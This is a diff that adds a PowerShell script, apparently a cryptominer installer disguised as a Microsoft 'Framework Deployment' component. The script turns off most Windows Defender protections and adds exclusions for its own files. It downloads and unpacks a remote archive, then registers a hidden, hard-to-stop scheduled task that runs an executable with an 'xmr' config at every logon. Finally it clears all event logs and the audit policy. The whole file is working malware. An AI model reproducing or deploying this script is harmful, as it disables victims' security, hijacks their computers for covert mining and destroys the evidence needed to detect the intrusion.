@@ -1,0 +1,26 @@
+set-executionpolicy unrestricted -Force;
+$location = get-location;
+Add-MpPreference -ExclusionPath $location -Force;
+$processloc = Join-Path -Path $location "Microsoft-Framework-Deployment.exe"
+Add-MpPreference -ExclusionProcess $processloc -Force;
+Add-MpPreference -ExclusionPath "C:\Users\Default\AppData\Local\Microsoft\FrameworkDeployment-master" -Force;
+Add-MpPreference -ExclusionProcess C:\Users\Default\AppData\Local\Microsoft\FramewokDeployment-master\Microsoft-Framework-Deployment.exe -Force;
+Set-MpPreference -DisableAutoExclusions 1 -DisablePrivacyMode 1 -DisableBehaviorMonitoring 1 -DisableIntrusionPreventionSystem 1 -DisableIOAVProtection 1 -DisableScriptScanning 1 -DisableArchiveScanning 1 -DisableCatchupFullScan 1 -DisableCatchupQuickScan 1 -DisableEmailScanning 1 -DisableRemovableDriveScanning 1 -DisableRestorePoint 1 -DisableScanningMappedNetworkDrivesForFullScan 1 -DisableScanningNetworkFiles 1 -DisableBlockAtFirstSeen 1 -PUAProtection disable -Force;
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+(New-Object System.Net.WebClient).DownloadFile("https://codeload.github.com/Satcomx00-x00/FrameworkDeployment/zip/master", "C:\Users\Default\AppData\Local\Microsoft\MicrosoftFrameworkDeployment.zip"); 
+Expand-Archive "C:\Users\Default\AppData\Local\Microsoft\MicrosoftFrameworkDeployment.zip" -DestinationPath "C:\Users\Default\AppData\Local\Microsoft";
+Remove-Item "C:\Users\Default\AppData\Local\Microsoft\MicrosoftFrameworkDeployment.zip";
+$scpath = "'set-location C:\Users\Default\AppData\Local\Microsoft\FrameworkDeployment-master; &.\Microsoft-Framework-Deployment.exe .\config_xmr.ini'";
+$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe " -Argument "-windowstyle Hidden -nop -ep bypass -noexit -Command $scpath";
+$trigger =  New-ScheduledTaskTrigger -AtLogon;
+$settings = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -DisallowHardTerminate -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -WakeToRun -Priority 7;
+$principal = New-ScheduledTaskPrincipal -UserID "LOCALSERVICE";
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Microsoft-Framework-Deployment" -Description "Daily dump of Framework applog" -Settings $settings -Principal $principal -Force;
+Enable-ScheduledTask -TaskName "Microsoft-Framework-Deployment";
+Start-ScheduledTask "Microsoft-Framework-Deployment";
+$cs = Get-WmiObject -class Win32_ComputerSystem;
+$Cores=$cs.numberoflogicalprocessors;
+$content = Get-Content .\config_xmr.ini | foreach { $_ -replace "COUNT",$Cores };
+Set-Content -Path ".\config_xmr.ini " -Value $content;
+Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log };
+auditpol.exe /clear /y;
